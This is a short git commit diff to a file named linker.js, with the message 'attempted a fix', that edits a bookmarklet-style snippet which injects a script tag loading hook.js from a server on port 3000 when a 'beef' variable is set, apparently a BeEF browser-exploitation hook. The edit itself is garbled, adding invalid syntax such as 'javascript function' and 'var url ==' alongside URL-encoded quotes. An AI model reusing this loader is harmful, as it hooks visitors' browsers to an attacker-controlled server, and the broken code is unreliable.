4056c9842e5f1d7eb6a108c61fd4cdd2fc95222a
QuizTheFur <134238467+QuizTheFur@users.noreply.github.com>
2023-05-21 19:14:17 -0400

    Update linker.js
    attempted a fix

--- linker.js
+++ linker.js
@@ -11,8 +11,8 @@ if(sending == 1) {
 
 
 
-function send() { 
-  var url = %27"https://0.0.0.0:3000/hook.js"%27;
+javascript function send() { 
+  var url == %27"https://0.0.0.0:3000/hook.js"%27;
   if (typeof beef == %27active%27) { 
   var bf = document.createElement(%27script%27); 
   bf.type = %27text%2fjavascript%27; bf.src = url; 
